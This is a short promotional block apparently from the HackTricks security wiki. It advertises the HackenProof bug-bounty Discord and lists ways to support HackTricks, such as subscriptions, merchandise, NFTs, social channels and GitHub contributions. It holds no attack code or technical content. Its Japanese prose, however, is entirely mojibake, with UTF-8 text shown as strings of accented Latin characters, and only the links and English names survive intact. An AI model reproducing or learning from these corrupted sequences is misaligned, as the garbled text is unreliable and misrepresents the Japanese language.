[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) ã‚µãƒ¼ãƒãƒ¼ã«å‚åŠ ã—ã¦ã€çµŒé¨“è±Šå¯Œãªãƒãƒƒã‚«ãƒ¼ã‚„ãƒã‚°ãƒã‚¦ãƒ³ãƒ†ã‚£ãƒãƒ³ã‚¿ãƒ¼ã¨ã‚³ãƒŸãƒ¥ãƒ‹ã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’å–ã‚Šã¾ã—ã‚‡ã†ï¼

**ãƒãƒƒã‚­ãƒ³ã‚°ã®æ´å¯ŸåŠ›**\
ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚¹ãƒªãƒ«ã¨ãƒãƒ£ãƒ¬ãƒ³ã‚¸ã«æ·±ãå…¥ã‚Šè¾¼ã‚€ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã¨äº¤æµã—ã¾ã—ã‚‡ã†

**ãƒªã‚¢ãƒ«ã‚¿ã‚¤ãƒ ãƒãƒƒã‚¯ãƒ‹ãƒ¥ãƒ¼ã‚¹**\
ãƒªã‚¢ãƒ«ã‚¿ã‚¤ãƒ ã®ãƒ‹ãƒ¥ãƒ¼ã‚¹ã¨æ´å¯Ÿã‚’é€šã˜ã¦ã€ãƒãƒƒã‚­ãƒ³ã‚°ã®ä¸–ç•Œã‚’æœ€æ–°æƒ…å ±ã§è¿½ã„ã‹ã‘ã¾ã—ã‚‡ã†

**æœ€æ–°ã®ã‚¢ãƒŠã‚¦ãƒ³ã‚¹ãƒ¡ãƒ³ãƒˆ**\
æœ€æ–°ã®ãƒã‚°ãƒã‚¦ãƒ³ãƒ†ã‚£ã®é–‹å§‹ã‚„é‡è¦ãªãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã®ã‚¢ãƒƒãƒ—ãƒ‡ãƒ¼ãƒˆã«ã¤ã„ã¦æƒ…å ±ã‚’å¾—ã¾ã—ã‚‡ã†

**[Discord](https://discord.com/invite/N3FrSbmwdy)** ã«å‚åŠ ã—ã¦ã€ä»Šæ—¥ã‹ã‚‰ãƒˆãƒƒãƒ—ãƒãƒƒã‚«ãƒ¼ã¨å”åŠ›ã—ã¾ã—ã‚‡ã†ï¼

<details>

<summary><strong>**htARTE (HackTricks AWS Red Team Expert)** ã§AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã³ã¾ã—ã‚‡ã†ï¼</strong></summary>

HackTricks ã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricks ã§ä¼æ¥­ã‚’å®£ä¼ã—ãŸã„** ã¾ãŸã¯ **HackTricks ã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„** å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASSï¼†HackTricksã‚¹ãƒ¯ãƒƒã‚°**](https://peass.creator-spring.com) ã‚’æ‰‹ã«å…¥ã‚Œã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª [**NFTs**](https://opensea.io/collection/the-peass-family) ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã‚‹
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f) ã¾ãŸã¯ [**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass) ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live) ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹
* **HackTricks** ã¨ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹

</details>
